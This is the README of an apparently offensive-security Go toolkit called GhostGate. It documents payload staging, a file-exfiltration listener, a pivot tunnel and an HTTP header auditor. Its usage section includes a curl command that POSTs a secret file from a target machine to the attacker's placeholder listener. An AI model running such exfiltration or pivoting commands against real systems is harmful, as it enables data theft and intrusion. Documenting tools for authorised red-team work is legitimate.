# GhostGate

GhostGate is a versatile Go-based networking toolkit designed for penetration testing, red teaming, and security auditing. It simplifies the process of setting up payload staging environments, running data exfiltration handlers, establishing reverse/pivot tunnels, and conducting quick HTTP security configuration audits.

---

## Features

* **Payload Staging (`stageDir`):** Instantly host and stage payloads from a source directory to a designated target staging path.
* **Data Exfiltration Listener (`uploadFile`):** Set up an HTTP POST endpoint to securely receive exfiltrated files from target machines.
* **Pivot Tunneling (`tunnel`):** Spin up a reverse proxy/tunnel server to pivot traffic through a compromised or intermediary host.
* **Configuration Auditing (`auditCon`):** Run an active security header and configuration audit against a target URL with automated analysis.
* **Built-in Sanitation & Validation:** Automatically validates and sanitizes input ports, URLs, and file paths to prevent structural breaks during runtime.

---

## Installation & Setup

1. Clone the repository and navigate to the project directory:
```bash
git clone https://github.com/yourusername/GhostGate.git
cd GhostGate

```


2. Initialize the default configuration file:
```bash
go run main.go init

```


*This will generate a configuration file utilizing preset defaults for ports, payload directories, and paths.*

---

## Usage

GhostGate utilizes a subcommand-based CLI architecture. Run the tool using one of the primary modules detailed below:

### 1. Payload Staging (`stageDir`)

Hosts a local directory containing tools or payloads.

```bash
go run main.go stageDir -p <port> -f <staging_path> -s <source_path>

```

| Flag | Default | Description |
| --- | --- | --- |
| `-p` | `cfg.DefaultPort` | The port number to host the staging server on. |
| `-f` | `cfg.DefaultPayloadsDirectory` | The destination path of the staging directory. |
| `-s` | *None (Required)* | The file path of your local source payloads directory. |

### 2. Data Exfiltration Listener (`uploadFile`)

Launches an HTTP server specifically configured to receive raw binary files or text data via POST requests.

```bash
go run main.go uploadFile -p <port> -u <endpoint_path>

```

| Flag | Default | Description |
| --- | --- | --- |
| `-p` | `cfg.DefaultPort` | The port number to bind the exfiltration listener to. |
| `-u` | `cfg.DefaultURLPath` | The URI endpoint where the listener accepts uploads (e.g., `/upload`). |

**Testing Exfiltration:**
You can test the listener from a target machine using `curl`:

```bash
curl -X POST --data-binary @secret.txt -H 'X-File-Name: secret.txt' http://<GhostGate_IP>:<Port>/upload

```

### 3. Pivot Tunnel Server (`tunnel`)

Acts as an HTTP reverse proxy, routing incoming traffic received on the server out to a designated target destination.

```bash
go run main.go tunnel -u <target_url> -p <local_port>

```

| Flag | Default | Description |
| --- | --- | --- |
| `-u` | *None (Required)* | The target destination URL you wish to tunnel traffic to. |
| `-p` | `cfg.DefaultPort` | The local port to host the tunneling endpoint on. |

**Interacting with the Tunnel:**

```bash
curl -X GET http://<GhostGate_IP>:<Local_Port>/<path>

```

### 4. Configuration Auditor (`auditCon`)

Sends an active HTTP request to a target application to analyze its response headers, SSL configurations, and overall security posture.

```bash
go run main.go auditCon -u <target_url>

```

| Flag | Default | Description |
| --- | --- | --- |
| `-u` | *None (Required)* | The target URL to actively scan and audit. |

---

## Project Structure

```text
GhostGate/
├── config/                 # Handles configuration files and defaults via Viper
├── internal/
│   ├── essentail/          # Core operational logic (Staging, Auditing, Uploading)
│   ├── networking/          # Network utilities (e.g., pulling outbound IPs)
│   ├── sanitation/          # Cleans and normalizes CLI arguments 
│   └── validation/          # Validates structural safety of inputs (Ports, paths, URLs)
└── main.go                 # Application entrypoint and CLI router

```

---

## Disclaimer

> **Notice:** GhostGate is created solely for authorized security assessments, educational exercises, and defensive auditing. Do not use this tool against infrastructure you do not explicitly own or have written authorization to test.